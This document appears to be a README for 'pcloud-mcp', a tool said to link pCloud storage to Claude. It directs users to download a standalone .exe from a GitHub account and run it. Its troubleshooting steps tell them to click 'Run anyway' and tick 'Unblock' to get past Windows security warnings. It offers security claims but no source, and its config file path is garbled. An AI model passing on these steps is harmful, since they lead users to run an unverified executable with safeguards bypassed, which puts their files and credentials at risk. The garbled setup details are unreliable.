# ☁️ pcloud-mcp - Access your clouds through secure AI

[![](https://img.shields.io/badge/Download_pcloud--mcp-blue.svg)](https://github.com/shaylaisotonic44/pcloud-mcp)

pcloud-mcp connects your pCloud storage to AI tools like Claude. It allows AI models to read, navigate, and manage your cloud files safely. Security remains the priority. This software uses strict access controls to prevent unauthorized access to your file system.

## 📁 What this does

- Connects your Claude AI to pCloud.
- Blocks unauthorized file access.
- Operates as a single, simple file.
- Uses secure account authorization.

## 🖥️ System requirements

This tool runs on Windows 10 or Windows 11. It requires no extra software installations or coding tools. 

- Operating System: Windows 10 or 11 (64-bit)
- Disk Space: 50 MB
- Internet Connection: Required for pCloud login

## 📥 How to download and install

1. Visit the [official releases page](https://github.com/shaylaisotonic44/pcloud-mcp) to download the software.
2. Look for the file ending in `.exe` under the latest release.
3. Save this file to a folder on your computer, such as your Downloads folder or Documents.
4. Locate the saved file. You do not need to install it. The program runs as a standalone tool.

## ⚙️ Running the program

1. Find the file you downloaded.
2. Double-click the file named `pcloud-mcp.exe`.
3. A small black window, known as a command prompt, will open. This window shows the status of the connection.
4. Keep this window open while you use your AI tools. Closing this window stops the connection to your pCloud data.
5. If Windows shows a security prompt requesting permission, click "Run" or "More info" then "Run anyway." This happens because the file is independent.

## 🔐 Security and your data

The program uses OAuth for authentication. You never share your main pCloud password with the AI. The tool only receives a secure token to access your files.

- Path-traversal-proof: The software blocks any attempt to look at files outside your pCloud drive.
- Local execution: The tool runs on your machine. No data passes through external servers except when you authorize access to specific files.
- Static binary: The file contains everything it needs to function. It does not pull in external pieces of software that could pose a risk.

## 🛠️ Connecting to Claude

To use pcloud-mcp with Claude, you must update your AI client configuration file. 

1. Open your Claude Desktop configuration file. This is usually located at `%APPDATA%\Claude\clauser_desktop_config.json`.
2. Add the path to your downloaded file inside the configuration settings.
3. Use the following format as a guide for your configuration file:

{
  "mcpServers": {
    "pcloud": {
      "command": "C:\\Path\\To\\Your\\pcloud-mcp.exe"
    }
  }
}

4. Replace `C:\\Path\\To\\Your\\pcloud-mcp.exe` with the actual location of the file on your computer. Note the double backslashes in the path. These are necessary for Windows configuration files.

## ❓ Troubleshooting common issues

If you encounter trouble, use these steps to fix the most common problems.

### The windows closes immediately
This usually means a required setting is missing. Verify your pCloud login tokens are valid and that your internet connection is active. Check that your firewall permits the program to reach the pCloud servers.

### The AI cannot see my files
Ensure your configuration file points to the exact location of the file on your hard drive. Restart the Claude application after saving changes to the configuration file.

### Permissions errors
If the program struggles to run, right-click the file and select "Properties." Check the box marked "Unblock" if it appears under the General tab at the bottom. This tells Windows that you trust the file downloaded from the internet.

### Keeping the software updated
Check the release page periodically for new versions. When a new version appears, simply download the new file and replace the old one in your folder. The program does not have an automatic update feature to ensure maximum stability and security.

### Understanding the interface
The interface is intentionally simple. It acts as a bridge between your cloud storage and your AI tools. It does not perform tasks on its own. It waits for commands from your AI client and translates those into requests for pCloud. Once the command finishes, it returns the result to your AI client window. This keeps your interface clean and focused on your work.